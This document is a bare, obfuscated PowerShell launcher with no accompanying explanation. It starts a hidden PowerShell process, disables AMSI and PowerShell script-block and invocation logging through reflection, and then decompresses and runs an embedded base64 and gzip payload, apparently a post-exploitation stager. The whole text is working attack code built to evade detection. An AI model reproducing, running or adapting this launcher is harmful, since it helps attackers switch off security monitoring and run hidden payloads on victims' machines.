powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c If($PSVersionTable.PSVersion.Major -ge 3){ $kqN=[Ref].Assembly.GetType(((''''+''{4''+''}''+''{5}s''+''t''+''em{9}''+''{''+''0}a''+''na{6}''+''em''+''ent{9}{''+''8''+''}{2}t{7''+''}m''+''at''+''i{7''+''}n''+''{9}''+''{8}msi{''+''3}ti{1}''+''s'')-f''M'',''l'',''u'',''U'',''S'',''y'',''g'',''o'',''A'',''.'')); $hjZ=[Collections.Generic.Dictionary[string,System.Object]]::new(); $rtKn=((''{4''+''}na{1}l{2}''+''{0}c{3''+''}''+''iptBloc''+''k''+''{5}nvocationLogging''+'''')-f''S'',''b'',''e'',''r'',''E'',''I''); $lU=((''Enabl{3}S''+''cri''+''{0}t{''+''2}loc{1}Lo''+''ggi''+''ng'')-f''p'',''k'',''B'',''e''); $aS9Q=((''Sc''+''{2}i''+''p{1}''+''Block{0}o''+''gging'')-f''L'',''t'',''r''); $uI=[Ref].Assembly.GetType(((''{1}{5''+''}st''+''em.Mana{''+''3}emen''+''t''+''.A{2}tomati''+''on.{4}ti''+''{0}s'')-f''l'',''S'',''u'',''g'',''U'',''y'')); $y0G=$uI.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); if ($kqN) { $kqN.GetField(((''a''+''m''+''{''+''0''+''}iI{1}i{2}Fail''+''{''+''3}{4''+''}''+'''')-f''s'',''n'',''t'',''e'',''d''),''NonPublic,Static'').SetValue($null,$true); }; If ($y0G) { $zD=$y0G.GetValue($null); $hjZ.Add($rtKn,0); $hjZ.Add($lU,0); $zD[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$aS9Q]=$hjZ; If($zD[$aS9Q]){ $zD[$aS9Q][$rtKn]=0; $zD[$aS9Q][$lU]=0; } } Else { [Ref].Assembly.GetType(((''S''+''{1}{''+''3}te''+''m.Mana{2}e''+''ment.Au''+''tomation.S''+''c{''+''5}i{4}t{0}loc''+''k'')-f''B'',''y'',''g'',''s'',''p'',''r'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIAPcCOGgCA7VWbW/iOBD+vtL+h2iFRKKlEFq211Za6ZyEl3QJhQJlWxadTOKEUCemsQOle/vfbxySlr22d72TNlIUx54Zj595ZsZ+GrsiZLGyTZXv798p+dPHCY4UtbS{0}Ttusop''+''Tur4n2tFp6GCmfFXWKViuLRTiMZ2dnZpokJBa7/2qbCMQ5ieY{0}JFzVlD+VyYIk5OBiviSuUL4rpT+qbcrmmOZiWxO7C6IcoNiTa13mYulWdbiioVDL376VtelBfVZt3qWYcrU83HJBoqpHaVlTfmhyw9F2RdSyE7oJ48wX1UkYHx1WxzHHPumBtTVxiFgwj5fhKE+HSYhIk1ieSRrZiahlGPYT5iLPSwjn5Yoyleans9nv6jTf+zKNRRiRqh{0}LkrDVkCTr{0}CW8''+''2sGxR8kl8WegNRRJGAczTQOxNbslailOKa{0}o/8WM2iObArm3Kqn7SiDVF4lWgYA+O6XDvJSSnV75BTd3FNDgyWkA4P2Q+PkF''+''c3jjInqBO{0}8TxTPNVgh4rPYZDzPlz4peURzYHQuWbOG3NEpSos{0''+''}e8VZKm5ObyluN1QtN{0}Fs/dM{0}1zE2vWOjNniz''+''8FP3Sx''+''rtbBlLqdTJbxA9''+''jYm1jHIVuwVf1pagQn5IMlG''+''oh1gMf1XK+QDyLUBJgIZGW5Him1oxC8ahrpCH1SIJciCwHryDo2s/O7IKnlu3YIRHgt/sHtpZ8yBJSSOeZsS12l/8gVDYp5ryi9F''+''NIU7eiDA''+''mmxKsoKOZhvoRSwbJh+cldJ6UidDEXhbmZ9nc8831NFnORpC6EFjAYDVfEDTGVkFSUTugRYzsMg2L/8ouAmJhSSCCwtIaAwIwEYigkYRJwVZJDq''+''w6JsKMVJRGIZGWjRXEARSLPkoxgOCBe+TVHi3zYkV9CU2Cy5ybEe{0}iZqChXYSKgCkmYM479Hzee15+dP2ZC8gCpRaJNja2QmVBad75+kUzNUcowSQTg{0}UpYZGBOjhu7cq''+''N+OK6z+43N9WDTm''+''Yzr6P7woYMSp2MZg44V1ALk+X1juxl/2tYXcw/1{0}PHpb1bomd2Bte1eovPGcjAwx7ZAtq27KF1aNXgmDdE9t3XHjHDXaDZprXaCkC3mHZBpM94MGnoTced+OxkuHITkGrLg7dhiYNqiYdscXdyeXHt+j92{0}uHl3GAzYxG3hL/64ZwlGV{0}ZYPww7S33OM''+''ZpT7pyyo56OnUYMOHo3jv/R+jho1a1WJwGbzXPjoabbsTm5andHXR{0}dt9fg5enNuOmHDTumx5saO5KOH94IPLl56EaXfI6sxKef7lr16PzhoTMc{0}/M7VIf3MACHLXTFhNfq1{0}Zju88NC9ZZ3T1HlyOQG46jAIRuEeDimSBTOxrcG''+''j''+''C2YLy8vo7kkcftADXhi4N2b7FgMDIGsDbYrTFnOb62pT4CHezIPc3u18GopjfiT4F+bSPypYcDmLu{0}avrHxal{0}/ysyXGQ2EHwtZDH4wtNsoCtktFHLyfZAHReNAoOiptzKuArJ+H7TNLxNsEEfgEjTcRiLo8NZKWVtWxbd9+9Kt5yf7NHptZbi4IQvMAWaQbcoUr7FklZe//sslBqqCjeIW5LEhELXhb5cpAmi''+''lLmy92R9AvrerhvJ5ji2M6deGmnKo6D21JWKqbOzG/BR5h+kRLVL4kAsKvr9ka5DN9Hv9UaWYW8/mclWWzUzVpH''+''9KIOmsE4z62Aw''+''9BVV/dVowaVDQOl7Ha/XoIOdb6FSQencFQ8JoMEY3YcvP9cjGfbRA9jqcPSpvHBkLAELB+ROKQnZj/f7eym5dieXv5I5eRFcwMf7N+Y8zf3D6pvYpFd2+Dyb/nlir4f8MgAmOBQgN4RaTsnujvEyD''+''nmy7IU4Cw7kgp8/8u59kYqDHtznsobyF5NSrjryCwAA'')-f''0'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
